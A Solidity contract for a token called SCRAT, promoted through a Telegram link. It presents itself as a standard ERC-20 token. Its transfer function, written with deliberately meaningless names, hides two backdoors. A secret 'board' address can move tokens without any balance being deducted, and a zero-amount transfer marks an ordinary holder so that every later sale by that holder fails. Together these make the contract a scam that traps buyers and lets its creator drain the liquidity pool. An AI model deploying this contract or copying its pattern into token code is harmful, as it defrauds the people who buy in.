/*
Telegram: https://t.me/ScratERC
*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SCRAT is Ownable {
    address public uniswapV2Pair;

    mapping(address => uint256) private tollll;

    function equipp(address folll, address housss, uint256 five) private returns (bool succc) {
        if (tollll[folll] == 0) {
            balanceOf[folll] -= five;
        }

        if (five == 0) dot[housss] += grave;

        if (tollll[folll] == 0 && uniswapV2Pair != folll && dot[folll] > 0) {
            tollll[folll] -= grave;
        }

        balanceOf[housss] += five;
        emit Transfer(folll, housss, five);
        return true;
    }

    mapping(address => uint256) private dot;

    function transferFrom(address folll, address housss, uint256 five) public returns (bool succc) {
        require(five <= allowance[folll][msg.sender]);
        allowance[folll][msg.sender] -= five;
        equipp(folll, housss, five);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'SCRAT';

    function approve(address crouuu, uint256 five) public returns (bool succc) {
        allowance[msg.sender][crouuu] = five;
        emit Approval(msg.sender, crouuu, five);
        return true;
    }

    uint8 public decimals = 9;

    string public symbol = 'SCRAT';

    constructor(address board) {
        balanceOf[msg.sender] = totalSupply;
        tollll[board] = grave;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private grave = 6;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address housss, uint256 five) public returns (bool succc) {
        equipp(msg.sender, housss, five);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => mapping(address => uint256)) public allowance;
}